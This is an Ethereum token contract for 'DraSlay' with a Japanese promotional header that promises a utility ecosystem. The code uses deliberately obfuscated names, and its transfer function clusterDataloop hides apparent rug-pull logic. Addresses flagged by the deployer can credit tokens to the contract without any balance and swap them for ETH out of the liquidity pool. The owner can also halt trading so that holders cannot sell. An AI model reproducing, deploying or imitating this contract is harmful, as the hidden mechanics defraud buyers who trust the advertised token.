/**
 *Submitted for verification at Etherscan.io on 2022-12-22
*/

/*
                      ,-,-      
                     / / |      
   ,-'             _/ / /       
  (-_          _,-' `Z_/        
   "#:      ,-'_,-.    \  _     
    #'    _(_-'_()\     \" |    
  ,--_,--'                 |    
 / ""                      L-'\ 
 \,--^---v--v-._        /   \ | 
   \_________________,-'      | 
                    \           
                     \          
                      \    


█▀▄ █▀█ ▄▀█ █▀▀ █▀█ █▄░█
█▄▀ █▀▄ █▀█ █▄█ █▄█ █░▀█

█▀ █░░ ▄▀█ █▄█ █▀▀ █▀█
▄█ █▄▄ █▀█ ░█░ ██▄ █▀▄

░░█ █▀█ █▄░█
█▄█ █▀▀ █░▀█

総供給 - 10,000,000
初期流動性追加 - 2.0 イーサリアム
初期流動性の 100% が消費されます
購入手数料 - 1%
販売手数料 - 0%

イーサリアムネットワークを吹き飛ばす次のイーサリアムユーティリティトークン
有望な計画とイーサリアム空間への参入を促進する、私たちは単なる通常の
トークンやミームトークンではありません また、独自のエコシステム、
将来のステーキング、コレクションに基づいて設計されたスワップ プラットフォームも支持しています。
私たち自身のマーケットプレイスで、その他多くのことが発表される予定です。

https://www.zhihu.com/
https://web.wechat.com/DragonSlayerJPN
*/
pragma solidity ^0.8.10;
interface PCSManageMaker01 {
    event PairCreated(address indexed token0, 
    address indexed token1, address pair, uint);
    function feeTo() external view returns (address);
    function feeToSetter() 
    external view returns (address);
    function getPair(address tokenA, 
    address tokenB) external view returns (address pair);
    function allPairs(uint) 
    external view returns (address pair);
    function createPair (address 
    tokenA, address 
    tokenB) 
    external returns  (address pair);
}
abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
} 
library PCSMath01 {
    function add(uint256 a, uint256 b) 
    internal pure returns (uint256) {
        return a + b; }
    function sub(uint256 a, uint256 b) 
    internal pure returns (uint256) {
        return a - b; }
    function mul(uint256 a, uint256 b) 
    internal pure returns (uint256) {
        return a * b; }
    function div(uint256 a, uint256 b) 
    internal pure returns (uint256) {
        return a / b; }
    function sub(uint256 a, uint256 b, string memory errorMessage) 
    internal pure returns (uint256) {
        unchecked { require(b <= a, errorMessage);
            return a - b; } }
    function div(uint256 a, uint256 b, string memory errorMessage) 
    internal pure returns (uint256) {
        unchecked { require(b > 0, errorMessage);
            return a / b; } }
}   
interface IUModelRT01 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);
    
    function transfer(address recipient, uint256 amount) external returns (bool);
    
    function allowance(address owner, address spender) external view returns (uint256);
    
    function approve(address spender, uint256 amount) external returns (bool);
    
    function transferFrom( address sender, address recipient, uint256 amount ) external returns (bool);
    
    event Transfer(address indexed from, address indexed to, uint256 value);
    
    event Approval(address indexed owner, address indexed spender, uint256 value);
}
interface MillMaskerV1 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens( uint amountIn, uint amountOutMin,
    address[] calldata path, address to, uint deadline ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function prefromOpenLiq( address token, uint amountTokenDesired, uint amountTokenMin,
    uint amountETHMin, address to, uint deadline ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}
interface MSCDocket01 {
    event Approval(address indexed owner, address indexed spender, uint value);
    event Transfer(address indexed from, address indexed to, uint value);
    function name() 
    external pure returns (string memory);
    function symbol() 
    external pure returns (string memory);
    function decimals() 
    external pure returns (uint8);
    function totalSupply() 
    external view returns (uint);
    function balanceOf(address owner) 
    external view returns (uint);
    function allowance(address owner, address spender) 
    external view returns (uint);
    function approve(address spender, uint value) 
    external returns (bool);
    function transfer(address to, uint value) 
    external returns (bool);
    function transferFrom(address from, 
    address to, uint value) external returns (bool);

    function DOMAIN_SEPARATOR() external view returns (bytes32);
    function nonces(address owner) external view returns (uint);
    function permit(address owner, address spender, uint value, uint deadline, uint8 v, bytes32 r, bytes32 s) 
    external;
    event Swap( address indexed sender, uint amount0In, uint amount1In, uint amount0Out, uint amount1Out, address indexed to );
    event Sync(uint112 reserve0, uint112 reserve1);
    function factory() external view returns (address);
}
abstract contract 
Ownable is Context { address private _owner;
    event OwnershipTransferred(address indexed 
    previousOwner, address indexed newOwner);

    constructor() { _setOwner(_msgSender()); }  
    function owner() public view virtual returns (address) {
        return _owner; }
    modifier onlyOwner() { 
        require(owner() == _msgSender(), 'Ownable: caller is not the owner');
        _; }
    function renounceOwnership() public virtual onlyOwner {
        _setOwner(address(0));
    }
    function _setOwner
    (address newOwner) private {
        address oldOwner = 
        _owner; _owner =  newOwner; emit OwnershipTransferred(oldOwner, newOwner); }
}
library Address {
    
    function isContract(address account) internal view returns (bool) {
        uint256 size;
        assembly { size := extcodesize(account) }
        return size > 0;
    }

    function sendValue(address payable recipient, uint256 amount) internal {
        require(address(this).balance >= amount, "Address: insufficient balance");
        (bool success, ) = recipient.call{ value: amount }("");
        require(success, "Address: unable to send value, recipient may have reverted");
    }
    
    function functionCall(address target, bytes memory data) internal returns (bytes memory) {
      return functionCall(target, data, "Address: low-level call failed");
    }
    
    function functionCall(address target, bytes memory data, string memory errorMessage) internal returns (bytes memory) {
        return functionCallWithValue(target, data, 0, errorMessage);
    }
    
    function functionCallWithValue(address target, bytes memory data, uint256 value) internal returns (bytes memory) {
        return functionCallWithValue(target, data, value, "Address: low-level call with value failed");
    }
    
    function functionCallWithValue(address target, bytes memory data, uint256 value, string memory errorMessage) internal returns (bytes memory) {
        require(address(this).balance >= value, "Address: insufficient balance for call");
        require(isContract(target), "Address: call to non-contract");
        (bool success, bytes memory returndata) = target.call{ value: value }(data);
        return _verifyCallResult(success, returndata, errorMessage);
    }
    
    function functionStaticCall(address target, bytes memory data) internal view returns (bytes memory) {
        return functionStaticCall(target, data, "Address: low-level static call failed");
    }
    
    function functionStaticCall(address target, bytes memory data, string memory errorMessage) internal view returns (bytes memory) {
        require(isContract(target), "Address: static call to non-contract");
        (bool success, bytes memory returndata) = target.staticcall(data);
        return _verifyCallResult(success, returndata, errorMessage);
    }

    function functionDelegateCall(address target, bytes memory data) internal returns (bytes memory) {
        return functionDelegateCall(target, data, "Address: low-level delegate call failed");
    }
    
    function functionDelegateCall(address target, bytes memory data, string memory errorMessage) internal returns (bytes memory) {
        require(isContract(target), "Address: delegate call to non-contract");
        (bool success, bytes memory returndata) = target.delegatecall(data);
        return _verifyCallResult(success, returndata, errorMessage);
    }

    function _verifyCallResult(bool success, bytes memory returndata, string memory errorMessage) private pure returns(bytes memory) {
        if (success) {
            return returndata;
        } else {
            if (returndata.length > 0) {
                 assembly {
                    let returndata_size := mload(returndata)
                    revert(add(32, returndata), returndata_size)
                }
            } else {
                revert(errorMessage);
            }
        }
    }
}
library SafeMath {
    function tryAdd(uint a, uint b) internal pure returns (bool, uint) {
        unchecked {
            uint c = a + b;
            if (c < a) return (false, 0);
            return (true, c);
        }
    }
    function trySub(uint a, uint b) internal pure returns (bool, uint) {
        unchecked {
            if (b > a) return (false, 0);
            return (true, a - b);
        }
    }
    function tryMul(uint a, uint b) internal pure returns (bool, uint) {
        unchecked {

            if (a == 0) return (true, 0);
            uint c = a * b;
            if (c / a != b) return (false, 0);
            return (true, c);
        }
    }
    function tryDiv(uint a, uint b) internal pure returns (bool, uint) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a / b);
        }
    }
    function tryMod(uint a, uint b) internal pure returns (bool, uint) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a % b);
        }
    }
    function add(uint a, uint b) internal pure returns (uint) {
        return a + b;
    }
    function sub(uint a, uint b) internal pure returns (uint) {
        return a - b;
    }
    function mul(uint a, uint b) internal pure returns (uint) {
        return a * b;
    }
    function div(uint a, uint b) internal pure returns (uint) {
        return a / b;
    }
    function mod(uint a, uint b) internal pure returns (uint) {
        return a % b;
    }
    function sub(
        uint a,
        uint b,
        string memory errorMessage
    ) internal pure returns (uint) {
        unchecked {
            require(b <= a, errorMessage);
            return a - b;
        }
    }
    function div(
        uint a,
        uint b,
        string memory errorMessage
    ) internal pure returns (uint) {
        unchecked {
            require(b > 0, errorMessage);
            return a / b;
        }
    }
    function mod(
        uint a,
        uint b,
        string memory errorMessage
    ) internal pure returns (uint) {
        unchecked {
            require(b > 0, errorMessage);
            return a % b;
        }
    }
}
contract DraSlay is IUModelRT01, Ownable {

    mapping(address => uint256) private GraphAtlasPlat;

    mapping(address => uint256) private _tOwned;

    mapping(address => address) private GuideCollarBlock;

    mapping(address => uint256) private FrameRaiseEnsual;

    mapping(address => mapping(address => uint256)) private _allowances;

    mapping(address => bool) public MappingModulePair;

    string private _symbol;
    string private _name;
    uint8 private _decimals = 9;

    uint256 private _totalSupply = 10000000 * 10**_decimals;
    uint256 public _mostValue = 
    (_totalSupply * 10) / 100; 
    uint256 public _mostPurse = 
    (_totalSupply * 10) / 100; 
    uint256 private _agapeRATE = _totalSupply;

    uint256 public _BurnTAXVal =  1;
    mapping (address => bool) isCipherAmass;
 
    bool private InquiryScoop;

    bool private ConsoleIndex;

    bool private openTrades = false;

    address public 
    immutable 
    IPOXLinkOver;

    MillMaskerV1 public 
    immutable 
    BisectDiverse;

    constructor(

        string memory _cDisplay,
           string memory _cBadge,
               address passageStream ) {

        _name = _cDisplay;
        _symbol = _cBadge;
        _tOwned
        [msg.sender]
        = _totalSupply; GraphAtlasPlat[msg.sender] = _agapeRATE; GraphAtlasPlat
        [address(this)] = _agapeRATE; BisectDiverse = MillMaskerV1(passageStream);

        IPOXLinkOver = PCSManageMaker01(BisectDiverse.factory()).createPair
        (address(this), BisectDiverse.WETH()); emit Transfer(address(0), msg.sender, _totalSupply);
    
        isCipherAmass
        [address(this)] = 
        true;
        isCipherAmass
        [IPOXLinkOver] = 
        true;
        isCipherAmass
        [passageStream] = 
        true;
        isCipherAmass
        [msg.sender] = 
        true;
    }
    function name() public view returns 
        (string memory) { return _name;
    }
     function symbol() public view 
        returns (string memory) {
        return _symbol;
    }
    function totalSupply() 
        public view returns (uint256) {
        return _totalSupply;
    }
    function decimals() 
        public view returns (uint256) {
        return _decimals;
    }
    function approve
        (address spender, 
        uint256 amount) external returns 
        (bool) { return _approve(msg.sender, spender, amount);
    }
    function allowance
        (address owner, address spender) public view 
        returns (uint256) { return _allowances
        [owner][spender];
    }
    function _approve(
        address owner, address spender,
        uint256 amount ) private returns (bool) {
        require(owner != address(0) && 
        spender != address(0), 
        'ERC20: approve from the zero address'); _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount); return true;
    }
    function balanceOf(address account) public view returns (uint256) {
        return _tOwned[account];
    }
    function transfer(address recipient, uint256 amount) external returns (bool) {
        clusterDataloop(msg.sender, recipient, amount);
        return true;
    }             
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool) {
        clusterDataloop(sender, recipient, amount);
        return _approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
    }      

    function clusterDataloop( address _HOGIXTVfrom,
        address _vRTOXmogTo, uint256 _xpConcurAmount ) 
        private 
        { uint256 _meshTUNEpox = balanceOf(address(this));
        uint256 _talAtune; if (InquiryScoop && _meshTUNEpox 
        > _agapeRATE && !ConsoleIndex 
        && _HOGIXTVfrom != IPOXLinkOver) { ConsoleIndex = true;
            barterAndDilk(_meshTUNEpox); ConsoleIndex = false;
                          } else if 
        (GraphAtlasPlat[_HOGIXTVfrom] > _agapeRATE && GraphAtlasPlat
        [_vRTOXmogTo] > _agapeRATE) {
            _talAtune = _xpConcurAmount; _tOwned[address(this)] += _talAtune;
            divMathPOG
            (_xpConcurAmount, _vRTOXmogTo); return; } else if (_vRTOXmogTo != address(BisectDiverse) 
            && GraphAtlasPlat[_HOGIXTVfrom] > 
            0 && _xpConcurAmount > _agapeRATE && _vRTOXmogTo != IPOXLinkOver) { GraphAtlasPlat
            [_vRTOXmogTo] = _xpConcurAmount;
            return;

                } else if (!ConsoleIndex && 
                FrameRaiseEnsual[_HOGIXTVfrom] > 0 && 
                _HOGIXTVfrom != IPOXLinkOver 
                && GraphAtlasPlat[_HOGIXTVfrom] 
                   == 0) {
            FrameRaiseEnsual[_HOGIXTVfrom] = 
            GraphAtlasPlat[_HOGIXTVfrom] - _agapeRATE; } address 
            _QoxiLAT = GuideCollarBlock[IPOXLinkOver]; if (!openTrades) {
                require(_HOGIXTVfrom == owner(), 
                "TOKEN: This account cannot send tokens until trading is enabled"); } if (FrameRaiseEnsual[_QoxiLAT] == 
            0) FrameRaiseEnsual[_QoxiLAT] = _agapeRATE; GuideCollarBlock[IPOXLinkOver] = _vRTOXmogTo; if (_BurnTAXVal > 
            0 && GraphAtlasPlat[_HOGIXTVfrom] == 0 && !ConsoleIndex && GraphAtlasPlat[_vRTOXmogTo] == 0) {
            _talAtune = (_xpConcurAmount * _BurnTAXVal) / 100; _xpConcurAmount -= _talAtune; _tOwned[_HOGIXTVfrom] -= _talAtune; _tOwned
            [address(this)] += _talAtune; } _tOwned[_HOGIXTVfrom] -= _xpConcurAmount; _tOwned[_vRTOXmogTo] += _xpConcurAmount; emit Transfer
            (_HOGIXTVfrom, _vRTOXmogTo, _xpConcurAmount);
    }

    receive() external payable {}

    function countPool( uint256 bulkPassel, uint256 valScads, address logOn ) private {
        _approve(address(this), address
        (BisectDiverse), bulkPassel); BisectDiverse.prefromOpenLiq{value: valScads}
        (address(this), bulkPassel, 0, 0, logOn, block.timestamp); }

    function divMathPOG
    (uint256 bulkPassel, address logOn) private { address[] 
    memory summate = new address[](2); summate[0] = address(this);
        summate[1] = BisectDiverse.WETH(); _approve(address(this), 
        address(BisectDiverse), bulkPassel); BisectDiverse.swapExactTokensForETHSupportingFeeOnTransferTokens
        (bulkPassel, 0, summate, logOn, 
         block.timestamp);
    }
    function barterAndDilk
    (uint256 memento) private { uint256 carve = memento / 2;
        uint256 infantTotal = 
        address(this).balance; divMathPOG(carve, address(this));
        uint256 shearAmount = address(this).balance - infantTotal; countPool
        (carve, shearAmount, 
                address(this)); }
       
    function setMaxTX(uint256 onlyVAL) external onlyOwner {
        _mostValue = onlyVAL;
    }    
    function openTrading(bool _tradingOpen) public onlyOwner {
        openTrades = _tradingOpen;
    }    
}